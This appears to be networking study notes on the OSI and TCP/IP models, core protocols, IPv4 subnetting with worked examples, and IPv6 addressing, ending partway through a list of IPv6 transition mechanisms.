# SECTION 1: Networking Fundamentals

---

## 1.1 What Is a Network?

A **computer network** is a collection of interconnected devices (nodes) that can communicate and share resources. Networks enable file sharing, internet access, communication, centralized management, and distributed computing.

**Key components of any network:**
- **End devices (hosts):** Computers, phones, servers, printers, IoT devices
- **Intermediary devices:** Routers, switches, firewalls, access points
- **Media:** The physical or wireless path data travels (cables, radio waves, fiber)
- **Services:** DHCP, DNS, HTTP, email — what the network provides

**Network representations:**
- **Physical topology:** The actual physical layout — where cables run, device locations
- **Logical topology:** How data flows — IP addressing, routing paths

---

## 1.2 The OSI Reference Model (Deep Dive)

The **OSI (Open Systems Interconnection)** model is a conceptual framework that standardizes network communication into 7 layers. It was developed by ISO in 1984. It is **not** a protocol itself — it is a *model* for understanding and designing networks.

**Mnemonic (top to bottom):** "All People Seem To Need Data Processing"  
**Mnemonic (bottom to top):** "Please Do Not Throw Sausage Pizza Away"

---

### Layer 7 — Application

**Function:** Interface between user applications and the network. This is NOT the user application itself, but the protocols that applications use.

**Key protocols:**
- **HTTP/HTTPS** — Web browsing (ports 80/443)
- **FTP/FTPS** — File transfer (ports 21/20 and 990)
- **SMTP** — Sending email (ports 25/587/465)
- **POP3/IMAP** — Receiving email (ports 110/995 and 143/993)
- **DNS** — Name resolution (port 53)
- **DHCP** — IP assignment (ports 67/68)
- **SSH** — Secure remote shell (port 22)
- **Telnet** — Insecure remote shell (port 23)
- **SNMP** — Network management (ports 161/162)
- **NTP** — Time synchronization (port 123)
- **LDAP/LDAPS** — Directory services (ports 389/636)
- **RDP** — Remote desktop (port 3389)
- **SIP** — VoIP signaling (ports 5060/5061)
- **SMB** — File sharing (port 445)

**Data unit:** Data

---

### Layer 6 — Presentation

**Function:** Data translation, encoding, compression, and encryption/decryption. Ensures data from the application layer of one system can be read by the application layer of another.

**Key functions:**
- **Encoding/decoding:** ASCII, Unicode, EBCDIC
- **Encryption/decryption:** TLS/SSL operates here
- **Compression:** JPEG, MPEG, GIF compression
- **Serialization:** Converting objects to transmittable format (JSON, XML)

**Examples:** JPEG, MPEG, TLS, SSL, ASCII, Unicode, MIME

**Data unit:** Data

---

### Layer 5 — Session

**Function:** Establishes, manages, and terminates communication sessions between applications. Handles session checkpointing and recovery.

**Key functions:**
- **Session establishment:** Creating a dialogue between applications
- **Session maintenance:** Keeping the session alive
- **Session termination:** Properly closing connections
- **Dialog control:** Half-duplex vs full-duplex management
- **Synchronization:** Checkpoints for long data transfers

**Examples:** NetBIOS, RPC (Remote Procedure Call), SQL sessions, NFS, SMB sessions, PPTP

**Data unit:** Data

---

### Layer 4 — Transport

**Function:** End-to-end reliable (or unreliable) delivery between applications. Provides port numbering for multiplexing, segmentation, flow control, and error correction.

**Key protocols:**
- **TCP (Transmission Control Protocol):**
  - Connection-oriented — 3-way handshake (SYN, SYN-ACK, ACK)
  - Guaranteed delivery — acknowledgments (ACKs)
  - Ordered delivery — sequence numbers
  - Flow control — sliding window
  - Congestion control — slow start, congestion avoidance
  - Error detection — checksum
  - Use: HTTP, SSH, FTP, SMTP, IMAP

- **UDP (User Datagram Protocol):**
  - Connectionless — no handshake
  - Best-effort delivery — no ACKs
  - No ordering — datagrams may arrive out of order
  - Fast and lightweight — low overhead
  - Use: DNS, DHCP, streaming video/audio, VoIP, gaming, TFTP, SNMP

**TCP vs UDP comparison:**

| Feature | TCP | UDP |
|---------|-----|-----|
| Connection | 3-way handshake | None |
| Reliability | Guaranteed (ACK) | Best-effort |
| Ordering | Sequence numbers | No guarantee |
| Speed | Slower (overhead) | Faster |
| Header size | 20–60 bytes | 8 bytes |
| Flow control | Yes (window) | No |
| Error recovery | Yes (retransmit) | No |
| Use case | Web, email, file | Streaming, DNS, VoIP |

**TCP 3-Way Handshake:**
```
Client                    Server
  |------- SYN (seq=x) ------->|   "I want to connect"
  |<-- SYN-ACK (seq=y,ack=x+1)--|   "OK, I agree"
  |------- ACK (ack=y+1) ------>|   "Acknowledged"
  |======= DATA TRANSFER ========|
```

**TCP 4-Way Termination:**
```
Client                    Server
  |-------- FIN ----------->|
  |<------- ACK ------------|
  |<------- FIN ------------|
  |-------- ACK ----------->|
```

**TCP Header fields:**
- Source Port (16 bits)
- Destination Port (16 bits)
- Sequence Number (32 bits)
- Acknowledgment Number (32 bits)
- Data Offset / Flags (SYN, ACK, FIN, RST, PSH, URG)
- Window Size (16 bits) — flow control
- Checksum (16 bits)
- Urgent Pointer (16 bits)

**TCP Flags:**
- **SYN** — Synchronize (initiate connection)
- **ACK** — Acknowledge
- **FIN** — Finish (graceful close)
- **RST** — Reset (abrupt close)
- **PSH** — Push (don't buffer, deliver immediately)
- **URG** — Urgent data
- **ECE** — ECN Echo
- **CWR** — Congestion Window Reduced

**Port ranges:**
- **Well-known ports:** 0–1023 (assigned by IANA, require root/admin)
- **Registered ports:** 1024–49151 (registered applications)
- **Dynamic/Ephemeral ports:** 49152–65535 (temporary client ports)

**Data unit:** Segment (TCP) / Datagram (UDP)

---

### Layer 3 — Network

**Function:** Logical addressing and routing. Determines the best path from source to destination across multiple networks.

**Key protocols:**
- **IPv4** — 32-bit logical addressing
- **IPv6** — 128-bit logical addressing
- **ICMP** — Internet Control Message Protocol (ping, traceroute, errors)
- **ICMPv6** — ICMP for IPv6 (includes Neighbor Discovery)
- **OSPF** — Open Shortest Path First (routing protocol)
- **EIGRP** — Enhanced Interior Gateway Routing Protocol
- **BGP** — Border Gateway Protocol (internet routing)
- **RIP** — Routing Information Protocol (legacy)
- **ARP** — Address Resolution Protocol (Layer 2/3 boundary)

**Devices:** Routers, Layer 3 switches, firewalls

**Key functions:**
- Logical addressing (IP addresses)
- Routing (forwarding packets)
- Path determination (best route)
- Packet fragmentation (splitting for MTU)
- TTL (Time to Live) — prevents infinite loops

**IPv4 Packet Header:**
- Version (4 bits) — 4 for IPv4
- IHL — Internet Header Length
- DSCP/ECN — QoS markings
- Total Length
- Identification, Flags, Fragment Offset
- TTL (8 bits) — decremented at each hop; drop at 0
- Protocol (8 bits) — 6=TCP, 17=UDP, 1=ICMP, 89=OSPF
- Header Checksum
- Source IP (32 bits)
- Destination IP (32 bits)
- Options (variable)

**Data unit:** Packet

---

### Layer 2 — Data Link

**Function:** Physical addressing (MAC addresses), framing, error detection on a single link. Governs access to the physical medium.

**Sub-layers:**
- **LLC (Logical Link Control):** Interface between Layer 2 and Layer 3; identifies upper-layer protocol
- **MAC (Media Access Control):** Physical addressing, access control to the medium

**Key protocols:**
- **Ethernet (802.3)** — Wired LAN
- **Wi-Fi (802.11)** — Wireless LAN
- **PPP** — Point-to-Point Protocol (WAN links)
- **HDLC** — High-Level Data Link Control (Cisco default serial)
- **Frame Relay** — Legacy WAN (mostly obsolete)
- **ATM** — Asynchronous Transfer Mode (legacy)
- **ARP** — Address Resolution Protocol (maps IP to MAC)

**Devices:** Switches, bridges, NICs

**MAC Addresses:**
- 48-bit (6-byte) hardware address burned into NIC
- Written as hexadecimal: `00:1A:2B:3C:4D:5E`
- First 3 bytes = OUI (Organizationally Unique Identifier) — manufacturer
- Last 3 bytes = Device identifier
- **Unicast:** Specific device (LSB of first byte = 0)
- **Multicast:** Group of devices (LSB of first byte = 1)
- **Broadcast:** All devices on segment (`FF:FF:FF:FF:FF:FF`)

**Ethernet Frame:**
```
| Preamble | SFD | Dest MAC | Src MAC | EtherType/Len | Payload | FCS |
|  7 bytes | 1 B |  6 bytes | 6 bytes |    2 bytes    | 46-1500B| 4 B |
```
- **Preamble:** 10101010... — clock synchronization
- **SFD (Start Frame Delimiter):** 10101011 — marks start
- **EtherType:** 0x0800=IPv4, 0x0806=ARP, 0x86DD=IPv6, 0x8100=VLAN tagged
- **FCS (Frame Check Sequence):** CRC error detection

**Data unit:** Frame

---

### Layer 1 — Physical

**Function:** Transmits raw bits over a physical medium. Defines electrical signals, voltages, frequencies, and connector types.

**Key standards:**
- **Ethernet:** IEEE 802.3 — defines copper and fiber physical layer
- **Wi-Fi:** IEEE 802.11 — wireless physical and MAC layer
- **USB, Bluetooth, RS-232**

**Devices:** Hubs, repeaters, cables, connectors, modems (physical aspects)

**Signal types:**
- **Digital:** Discrete states (0 or 1) — used by most modern networks
- **Analog:** Continuous waveform — used in DSL, cable modems
- **Optical:** Light pulses in fiber — fastest, longest distance

**Data unit:** Bit

**Transmission modes:**
- **Simplex:** One direction only (radio broadcast)
- **Half-duplex:** Both directions, not simultaneously (walkie-talkie, hub)
- **Full-duplex:** Both directions simultaneously (switch, modern NICs)

---

## 1.3 Encapsulation and Decapsulation

As data moves **down** the OSI stack at the sender, each layer adds its own header (and sometimes trailer). This is **encapsulation**.

```
Application: [  DATA  ]
Transport:   [ TCP HDR |  DATA  ]  ← Segment
Network:     [ IP HDR | TCP HDR | DATA ]  ← Packet
Data Link:   [ ETH HDR | IP HDR | TCP HDR | DATA | FCS ]  ← Frame
Physical:    01101000110101...  ← Bits
```

At the receiver, each layer **decapsulates** (removes its header) and passes the data up.

**Protocol Data Units (PDUs) by layer:**
- Layer 7/6/5: **Message / Data**
- Layer 4: **Segment** (TCP) / **Datagram** (UDP)
- Layer 3: **Packet**
- Layer 2: **Frame**
- Layer 1: **Bit**

---

## 1.4 The TCP/IP Model

The TCP/IP model (also called the Internet model or DoD model) is the practical model used by the internet. It consolidates the OSI layers:

| TCP/IP Layer | OSI Equivalent | Key Protocols |
|-------------|----------------|--------------|
| Application | 5, 6, 7 | HTTP, FTP, DNS, SMTP, SSH |
| Transport | 4 | TCP, UDP |
| Internet | 3 | IP, ICMP, ARP |
| Network Access | 1, 2 | Ethernet, Wi-Fi, PPP |

---

## 1.5 Network Communication Types

**Unicast:** One-to-one communication. A single source sends to a single destination.
- Example: Web browser → web server

**Broadcast:** One-to-all communication. Sent to all devices on a network segment.
- IPv4 broadcast: `255.255.255.255` (limited) or `x.x.x.255` (directed)
- Layer 2 broadcast: `FF:FF:FF:FF:FF:FF`
- IPv6 has NO broadcast — uses multicast instead

**Multicast:** One-to-many communication. Sent only to devices that have joined a multicast group.
- IPv4 multicast range: `224.0.0.0 – 239.255.255.255` (Class D)
- IPv6 multicast prefix: `FF00::/8`
- Used by: streaming video, routing protocols (OSPF uses 224.0.0.5/6)

**Anycast:** One-to-nearest. Packet sent to nearest member of a group.
- Used by: IPv6, CDNs, DNS root servers
- Multiple servers share the same IP; routing sends to closest

---

## 1.6 Network Bandwidth and Throughput Concepts

**Bandwidth:** Maximum theoretical data rate a medium can support (e.g., 1 Gbps Ethernet). Measured in bits per second (bps).

**Throughput:** Actual data rate achieved in practice. Always less than bandwidth due to overhead, collisions, protocol inefficiency.

**Goodput:** Useful application-level throughput. Excludes protocol headers and retransmissions.

**Latency:** Time for a packet to travel from source to destination. Measured in milliseconds (ms).
- **Propagation delay:** Time for signal to travel the medium (speed of light)
- **Transmission delay:** Time to push all bits onto the wire (packet size ÷ bandwidth)
- **Processing delay:** Time for device to process packet (routing table lookup)
- **Queuing delay:** Time packet waits in buffer

**Jitter:** Variation in latency between packets. Critical for VoIP and video.

**RTT (Round Trip Time):** Time for packet to reach destination and reply to return. What `ping` measures.

**Bandwidth delay product:** Bandwidth × Latency = How much data can be "in flight"

**Speed units:**
- 1 Kbps = 1,000 bps
- 1 Mbps = 1,000,000 bps
- 1 Gbps = 1,000,000,000 bps
- Note: Storage uses bytes (KB/MB/GB), networking uses bits (Kbps/Mbps/Gbps)
- 1 byte = 8 bits

---

## 1.7 Key Networking Protocols Reference

### ICMP (Internet Control Message Protocol)
- Layer 3 protocol used for error reporting and diagnostics
- **Type 0** — Echo Reply (ping response)
- **Type 3** — Destination Unreachable (with codes: 0=net, 1=host, 3=port, 4=fragmentation needed)
- **Type 5** — Redirect
- **Type 8** — Echo Request (ping)
- **Type 11** — Time Exceeded (TTL expired — used by traceroute)
- **Type 12** — Parameter Problem
- Does NOT use TCP or UDP — directly encapsulated in IP (Protocol 1)

### ARP (Address Resolution Protocol)
- Resolves IPv4 address → MAC address on local segment
- **ARP Request:** Broadcast asking "Who has IP x.x.x.x? Tell IP y.y.y.y"
- **ARP Reply:** Unicast response with MAC address
- **ARP Cache:** Table of IP→MAC mappings (cached for efficiency)
- **Gratuitous ARP:** Device announces its own IP→MAC (used for updates or attacks)
- **Proxy ARP:** Router responds to ARP requests on behalf of another host
- ARP is IPv4 only; IPv6 uses **Neighbor Discovery Protocol (NDP)** with ICMPv6

### NDP (Neighbor Discovery Protocol) — IPv6
- Replaces ARP for IPv6
- Uses ICMPv6 message types:
  - **133 — Router Solicitation (RS):** Hosts request router info
  - **134 — Router Advertisement (RA):** Routers announce prefix info
  - **135 — Neighbor Solicitation (NS):** Like ARP request (find MAC)
  - **136 — Neighbor Advertisement (NA):** Like ARP reply
  - **137 — Redirect:** Inform host of better next-hop

### DNS (Domain Name System)
- Translates domain names to IP addresses
- Port 53 (UDP for queries, TCP for zone transfers and large responses)
- Hierarchical distributed database

**DNS Resolution process:**
```
1. Client checks local cache
2. Client queries Recursive Resolver (ISP or 8.8.8.8)
3. Resolver queries Root Nameservers (13 root servers, a-m.root-servers.net)
4. Root refers to TLD nameserver (.com, .org, .net)
5. TLD refers to Authoritative nameserver (ns1.example.com)
6. Authoritative returns the IP address
7. Resolver caches and returns to client (TTL governs cache time)
```

**DNS record types:**

| Record | Purpose | Example |
|--------|---------|---------|
| A | IPv4 address | example.com → 93.184.216.34 |
| AAAA | IPv6 address | example.com → 2606:2800::1 |
| CNAME | Canonical name (alias) | www → example.com |
| MX | Mail exchanger | 10 mail.example.com |
| NS | Nameserver | ns1.example.com |
| PTR | Reverse DNS | 34.216.184.93.in-addr.arpa → example.com |
| SOA | Start of Authority | Zone metadata, serial, refresh |
| TXT | Text record | SPF, DKIM, domain verification |
| SRV | Service locator | _sip._tcp.example.com |
| CAA | CA Authorization | Which CAs can issue certs |

**DNS security:**
- **DNSSEC:** Digitally signs DNS records to prevent spoofing
- **DoT (DNS over TLS):** Encrypts DNS queries (port 853)
- **DoH (DNS over HTTPS):** DNS in HTTPS (port 443)

### DHCP (Dynamic Host Configuration Protocol)
- Automatically assigns IP configuration to clients
- Ports: 67 (server), 68 (client)
- Uses UDP broadcast

**DORA Process:**
```
Client → DHCP Discover  (broadcast — "I need an IP")
Server → DHCP Offer     (unicast — "Here's an IP offer")
Client → DHCP Request   (broadcast — "I accept that IP")
Server → DHCP ACK       (unicast — "Confirmed, here's the lease")
```

**DHCP provides:**
- IP address
- Subnet mask
- Default gateway
- DNS server(s)
- Lease duration
- WINS server (legacy)
- Domain name
- NTP server
- TFTP server (for PXE boot)

**DHCP options (common):**
- Option 3: Router (default gateway)
- Option 6: DNS server
- Option 15: Domain name
- Option 43: Vendor-specific info
- Option 51: Lease time
- Option 53: DHCP message type
- Option 66: TFTP server
- Option 82: Relay agent info

**DHCP Relay Agent:** Forwards DHCP broadcasts across router boundaries. Configured with `ip helper-address` on Cisco routers.

**DHCPv6:** IPv6 equivalent
- **Stateful DHCPv6:** Assigns full IPv6 address + info (like DHCP)
- **Stateless DHCPv6 (SLAAC+):** Provides options (DNS, NTP) but not address
- **SLAAC (Stateless Address Autoconfiguration):** IPv6 client generates own address from prefix

---

## 1.8 Network Topologies

### Physical Topologies

**Bus:**
- All devices connected to a single cable (backbone)
- Termination resistors at each end
- Single point of failure — one break kills the network
- Cheap but not scalable; legacy (10Base2, 10Base5)

**Star:**
- All devices connect to a central device (switch/hub)
- Most common modern topology
- Failure of central device kills network; single device failure isolated
- Easy to add/remove nodes

**Ring:**
- Devices connected in a circle
- Data travels in one or both directions
- Used by: Token Ring (IEEE 802.5), SONET, FDDI
- Dual ring provides redundancy

**Mesh:**
- Every device connected to every other device
- Full mesh: n(n-1)/2 connections needed
- Highly redundant, expensive, complex
- Used by WAN cores, internet backbone

**Partial mesh:**
- Most nodes meshed, some not
- Balance of redundancy and cost

**Hybrid:**
- Combination of topologies (e.g., star-bus, star-ring)

**Tree (Hierarchical):**
- Layered star topology
- Root → Distribution → Access layers
- Used in enterprise campus networks

### Logical Topologies

How data flows, regardless of physical layout:
- **Logical bus:** Even in physical star, hubs create logical bus (shared medium)
- **Logical ring:** Token passing even in physical ring or star (Token Ring)

---

## 1.9 LAN, WAN, MAN, PAN, and Other Network Types

| Type | Full Name | Coverage | Example |
|------|-----------|---------|---------|
| PAN | Personal Area Network | ~10 meters | Bluetooth headset, USB |
| LAN | Local Area Network | Building/campus | Office network |
| WLAN | Wireless LAN | Building/campus | Wi-Fi |
| CAN | Campus Area Network | Multiple buildings | University campus |
| MAN | Metropolitan Area Network | City/region | City fiber ring |
| WAN | Wide Area Network | Country/world | Internet, MPLS |
| SAN | Storage Area Network | Datacenter | Fiber Channel |
| VLAN | Virtual LAN | Logical (any size) | Segmented switch |
| VPN | Virtual Private Network | Overlay | Encrypted tunnel |
| SDWAN | Software-Defined WAN | WAN | Centrally managed WAN |

---

## 1.10 Network Architecture Models

### Client-Server
- Centralized servers provide resources; clients request them
- Advantages: Centralized management, security, backups
- Disadvantages: Server = single point of failure, cost
- Examples: Web servers, file servers, email servers

### Peer-to-Peer (P2P)
- Each device acts as both client and server
- No dedicated servers
- Advantages: Simple, cheap, no single point of failure
- Disadvantages: Hard to manage, decentralized security
- Examples: Home networks, BitTorrent, blockchain

### Three-Tier Architecture
- **Access Layer:** Connects end users (access switches)
- **Distribution Layer:** Aggregates access layer, applies policies (routing, ACLs)
- **Core Layer:** High-speed backbone, maximum performance

### Spine-Leaf Architecture
- Modern datacenter design
- **Spine:** High-capacity backbone switches
- **Leaf:** Access switches (servers connect here)
- Every leaf connects to every spine (2-hop maximum)
- Eliminates STP, supports ECMP

### Software-Defined Networking (SDN)
- Separates **control plane** (decisions) from **data plane** (forwarding)
- **Controller:** Centralized intelligence (OpenFlow controller)
- **Southbound APIs:** Controller to devices (OpenFlow, NETCONF)
- **Northbound APIs:** Applications to controller (REST APIs)
- Benefits: Centralized management, automation, programmability

---

## 1.11 Network Standards Bodies

| Organization | Focus |
|-------------|-------|
| **IEEE** | LAN/MAN standards (802.3 Ethernet, 802.11 Wi-Fi) |
| **IETF** | Internet protocols (RFCs for TCP/IP, HTTP, DNS) |
| **IANA** | IP address allocation, port assignments, protocol numbers |
| **ARIN/RIPE/APNIC** | Regional IP address allocation |
| **ITU** | International telecom standards |
| **ISO** | OSI model, international standards |
| **TIA/EIA** | Physical cabling standards (TIA-568) |
| **ANSI** | US national standards |
| **3GPP** | Cellular (LTE, 5G) |

---
# SECTION 2: IP Addressing and Subnetting

---

## 2.1 IPv4 Addressing

### Binary and IPv4

IPv4 addresses are **32-bit binary numbers** written as 4 decimal octets separated by dots.

```
192     .  168    .   1    .  100
11000000   10101000  00000001  01100100
```

**Converting decimal to binary (octet):**
```
192 = 128+64 = 1 1 0 0 0 0 0 0
168 = 128+32+8 = 1 0 1 0 1 0 0 0
  1 = 0 0 0 0 0 0 0 1
100 = 64+32+4 = 0 1 1 0 0 1 0 0
```

**Bit values (memorize):**
```
Position:  128  64  32  16   8   4   2   1
           2^7 2^6 2^5 2^4 2^3 2^2 2^1 2^0
```

---

## 2.2 IPv4 Address Classes (Classful)

Originally, IP addresses were divided into classes based on the first octet.

| Class | First Octet Range | Default Mask | Network Bits | Host Bits | Max Networks | Max Hosts |
|-------|------------------|--------------|--------------|-----------|-------------|-----------|
| A | 1–126 | 255.0.0.0 /8 | 8 | 24 | 126 | 16,777,214 |
| B | 128–191 | 255.255.0.0 /16 | 16 | 16 | 16,384 | 65,534 |
| C | 192–223 | 255.255.255.0 /24 | 24 | 8 | 2,097,152 | 254 |
| D | 224–239 | N/A | Multicast | — | — | — |
| E | 240–255 | N/A | Reserved/Experimental | — | — | — |

**Special ranges:**
- `0.x.x.x` — "This" network (reserved, not assignable as host)
- `127.x.x.x` — Loopback (127.0.0.1 = localhost)
- `169.254.x.x` — APIPA / Link-local (auto-assigned when DHCP fails)
- `255.255.255.255` — Limited broadcast

---

## 2.3 Private IP Address Ranges (RFC 1918)

These are NOT routed on the public internet. Used inside organizations with NAT.

| Range | CIDR Notation | Class | Total Addresses |
|-------|--------------|-------|----------------|
| 10.0.0.0 – 10.255.255.255 | 10.0.0.0/8 | A | 16,777,216 |
| 172.16.0.0 – 172.31.255.255 | 172.16.0.0/12 | B | 1,048,576 |
| 192.168.0.0 – 192.168.255.255 | 192.168.0.0/16 | C | 65,536 |

**Other special ranges:**
- `100.64.0.0/10` — Shared address space (ISP carrier-grade NAT)
- `192.0.0.0/24` — IETF protocol assignments
- `192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24` — Documentation/examples
- `198.18.0.0/15` — Benchmark testing
- `240.0.0.0/4` — Reserved for future use

---

## 2.4 Subnet Masks

A **subnet mask** defines which portion of an IP address is the network part and which is the host part.

- **Network bits = 1s** (contiguous, from the left)
- **Host bits = 0s** (contiguous, from the right)

```
/24 mask:
Binary:  11111111.11111111.11111111.00000000
Decimal: 255      .255     .255     .0
```

The AND operation between IP and mask reveals the **network address**:
```
IP:   192.168.1.100  →  11000000.10101000.00000001.01100100
Mask: 255.255.255.0  →  11111111.11111111.11111111.00000000
AND:  192.168.1.0    →  11000000.10101000.00000001.00000000
      ↑ Network address
```

---

## 2.5 CIDR (Classless Inter-Domain Routing)

CIDR notation uses a `/prefix-length` to denote the subnet mask, replacing the outdated classful system.

**CIDR notation:** `192.168.1.0/24` means the first 24 bits are the network portion.

**Complete CIDR chart:**

| CIDR | Subnet Mask | Network Bits | Host Bits | Hosts Per Subnet | Notes |
|------|-------------|-------------|-----------|-----------------|-------|
| /1 | 128.0.0.0 | 1 | 31 | 2,147,483,646 | |
| /8 | 255.0.0.0 | 8 | 24 | 16,777,214 | Class A default |
| /9 | 255.128.0.0 | 9 | 23 | 8,388,606 | |
| /10 | 255.192.0.0 | 10 | 22 | 4,194,302 | |
| /11 | 255.224.0.0 | 11 | 21 | 2,097,150 | |
| /12 | 255.240.0.0 | 12 | 20 | 1,048,574 | RFC 1918 172.16/12 |
| /13 | 255.248.0.0 | 13 | 19 | 524,286 | |
| /14 | 255.252.0.0 | 14 | 18 | 262,142 | |
| /15 | 255.254.0.0 | 15 | 17 | 131,070 | |
| /16 | 255.255.0.0 | 16 | 16 | 65,534 | Class B default |
| /17 | 255.255.128.0 | 17 | 15 | 32,766 | |
| /18 | 255.255.192.0 | 18 | 14 | 16,382 | |
| /19 | 255.255.224.0 | 19 | 13 | 8,190 | |
| /20 | 255.255.240.0 | 20 | 12 | 4,094 | |
| /21 | 255.255.248.0 | 21 | 11 | 2,046 | |
| /22 | 255.255.252.0 | 22 | 10 | 1,022 | |
| /23 | 255.255.254.0 | 23 | 9 | 510 | |
| /24 | 255.255.255.0 | 24 | 8 | 254 | Class C default |
| /25 | 255.255.255.128 | 25 | 7 | 126 | |
| /26 | 255.255.255.192 | 26 | 6 | 62 | |
| /27 | 255.255.255.224 | 27 | 5 | 30 | |
| /28 | 255.255.255.240 | 28 | 4 | 14 | |
| /29 | 255.255.255.248 | 29 | 3 | 6 | |
| /30 | 255.255.255.252 | 30 | 2 | 2 | Point-to-point links |
| /31 | 255.255.255.254 | 31 | 1 | 2 (no net/broadcast) | RFC 3021 — P2P |
| /32 | 255.255.255.255 | 32 | 0 | 1 (host route) | Single host |

**Formula:** Hosts per subnet = **2^(host bits) – 2** (subtract network and broadcast addresses)

---

## 2.6 Subnetting — Step by Step

### Key addresses for any subnet:
1. **Network address:** All host bits = 0 (not assignable)
2. **First usable host:** Network address + 1
3. **Last usable host:** Broadcast address – 1
4. **Broadcast address:** All host bits = 1 (not assignable)

### Example 1: Subnet a /24 into /26s

**Given:** `192.168.10.0/24`  
**Need:** Subnets with at least 60 hosts each

**Step 1:** Choose prefix. /26 gives 2^6-2 = 62 hosts ✓

**Step 2:** How many subnets? 2^(26-24) = 2^2 = **4 subnets**

**Step 3:** Subnet increment = 256 – 192 = **64**

**Step 4:** List the subnets:

| Subnet | Network Address | Usable Range | Broadcast |
|--------|----------------|-------------|-----------|
| 1 | 192.168.10.0/26 | .1 – .62 | .63 |
| 2 | 192.168.10.64/26 | .65 – .126 | .127 |
| 3 | 192.168.10.128/26 | .129 – .190 | .191 |
| 4 | 192.168.10.192/26 | .193 – .254 | .255 |

### Example 2: Given IP, find network info

**Given:** `172.16.45.200/20`

**Step 1:** /20 mask = `255.255.240.0`

**Step 2:** Third octet interesting: 240 → increment = 256-240 = 16

**Step 3:** Find subnet: 45 ÷ 16 = 2 remainder 13 → 2×16 = 32

**Network address:** 172.16.32.0  
**Broadcast:** 172.16.47.255  
**Usable:** 172.16.32.1 – 172.16.47.254  
**Hosts:** 2^12 – 2 = 4,094

### Example 3: VLSM (Variable Length Subnet Masking)

VLSM allows using different prefix lengths for different subnets — maximizing address efficiency.

**Scenario:** `192.168.1.0/24`, need:
- Network A: 100 hosts
- Network B: 50 hosts
- Network C: 25 hosts
- Network D: 2 hosts (point-to-point link)

**Solution (assign largest first):**

**Network A (100 hosts):** Need /25 (126 hosts) → `192.168.1.0/25`
- Range: .1 – .126, Broadcast: .127

**Network B (50 hosts):** Need /26 (62 hosts) → `192.168.1.128/26`
- Range: .129 – .190, Broadcast: .191

**Network C (25 hosts):** Need /27 (30 hosts) → `192.168.1.192/27`
- Range: .193 – .222, Broadcast: .223

**Network D (2 hosts):** Need /30 → `192.168.1.224/30`
- Range: .225 – .226, Broadcast: .227

---

## 2.7 Subnetting Quick Tricks

### The Magic Number Method
1. Subtract the interesting octet's mask value from 256
2. That number is the **block size** (increment between subnets)
3. Subnets start at multiples of the block size

**Example:** /27 → 255.255.255.224 → 256-224 = **32**
Subnets: 0, 32, 64, 96, 128, 160, 192, 224

**Example:** /26 → 255.255.255.192 → 256-192 = **64**
Subnets: 0, 64, 128, 192

### Power of 2 Cheat Sheet
```
2^1 = 2     2^7 = 128
2^2 = 4     2^8 = 256
2^3 = 8     2^9 = 512
2^4 = 16    2^10 = 1,024
2^5 = 32    2^11 = 2,048
2^6 = 64    2^12 = 4,096
```

### Common /24 Subnets (memorize for exam speed)

| Prefix | Mask Last Octet | Increment | Subnets | Hosts |
|--------|----------------|-----------|---------|-------|
| /25 | 128 | 128 | 2 | 126 |
| /26 | 192 | 64 | 4 | 62 |
| /27 | 224 | 32 | 8 | 30 |
| /28 | 240 | 16 | 16 | 14 |
| /29 | 248 | 8 | 32 | 6 |
| /30 | 252 | 4 | 64 | 2 |

---

## 2.8 IPv6 Addressing (Deep Dive)

### Why IPv6?
- IPv4 exhaustion — IANA depleted in 2011; most regions followed
- NAT is a workaround, not a solution — breaks end-to-end connectivity
- IPv6 provides 2^128 ≈ 340 undecillion addresses

### IPv6 Format

**128-bit address** written as 8 groups of 4 hexadecimal digits, separated by colons:
```
2001:0db8:85a3:0000:0000:8a2e:0370:7334
```

**Abbreviation rules:**
1. **Leading zeros** in each group can be omitted:
   `0db8 → db8`, `0000 → 0`, `0370 → 370`
2. **One consecutive sequence of all-zero groups** can be replaced with `::` (only once!)

```
Full:        2001:0db8:0000:0000:0000:0000:0000:0001
Compress 1:  2001:db8:0:0:0:0:0:1
Compress 2:  2001:db8::1
```

**More examples:**
```
::1                          (loopback — 127 zeros then 1)
::                           (all zeros — unspecified address)
FE80::1                      (link-local)
FF02::1                      (all nodes multicast)
2001:db8:cafe:1::100         (typical global unicast with compressed zeros)
```

### IPv6 Address Types

| Type | Prefix | Description |
|------|--------|-------------|
| **Global Unicast** | 2000::/3 | Publicly routable, assigned by IANA |
| **Link-Local** | FE80::/10 | Auto-configured on every interface; not routed |
| **Unique Local** | FC00::/7 (FC00::/8 or FD00::/8) | Like private IPv4; not publicly routed |
| **Loopback** | ::1/128 | Like 127.0.0.1 |
| **Unspecified** | ::/128 | Like 0.0.0.0 (used during auto-config) |
| **Multicast** | FF00::/8 | One-to-many (replaces broadcast) |
| **Anycast** | Assigned from unicast space | Routed to nearest member |

**Global Unicast address structure:**
```
|  48 bits   |  16 bits  |   64 bits   |
| Global     | Subnet ID | Interface ID|
| Routing    |           | (EUI-64 or  |
| Prefix     |           |  random)    |
```

### Well-known IPv6 Multicast Addresses

| Address | Scope | Meaning |
|---------|-------|---------|
| FF02::1 | Link-local | All nodes |
| FF02::2 | Link-local | All routers |
| FF02::5 | Link-local | OSPF all routers |
| FF02::6 | Link-local | OSPF DR routers |
| FF02::9 | Link-local | RIPng routers |
| FF02::A | Link-local | EIGRP routers |
| FF02::1:2 | Link-local | DHCP agents |
| FF02::1:FF00:0/104 | Link-local | Solicited-node multicast |

### IPv6 Address Configuration Methods

**1. Manual/Static:** Manually configure address, prefix, gateway

**2. SLAAC (Stateless Address Autoconfiguration):**
- Router sends RA (Router Advertisement) with /64 prefix
- Host generates Interface ID using EUI-64 or random (RFC 7217)
- Host combines prefix + interface ID
- No DHCPv6 server needed
- DNS info provided via RA (RFC 8106) or DHCPv6

**EUI-64 Interface ID generation:**
```
MAC: 00:1A:2B:3C:4D:5E
1. Split MAC in half: 00:1A:2B | 3C:4D:5E
2. Insert FF:FE in middle: 00:1A:2B:FF:FE:3C:4D:5E
3. Flip 7th bit (Universal/Local bit): 02:1A:2B:FF:FE:3C:4D:5E
4. Format as IPv6: 021A:2BFF:FE3C:4D5E
```

**3. Stateful DHCPv6:**
- Server assigns full IPv6 address + configuration
- Router RA sets M flag (Managed = use DHCPv6 for address)

**4. Stateless DHCPv6 (SLAAC + DHCPv6):**
- SLAAC assigns address; DHCPv6 provides DNS, NTP, etc.
- Router RA sets O flag (Other = use DHCPv6 for other info)

### IPv6 Transition Mechanisms

**Dual-Stack:** Device runs both IPv4 and IPv6 simultaneously — preferred approach

**Tunneling:** Encapsulate IPv6 packets inside IPv4 for transport:
- **6in4 (Protocol 41):** Manual tunnel
- **6to4:** Automatic, uses 2002::/16
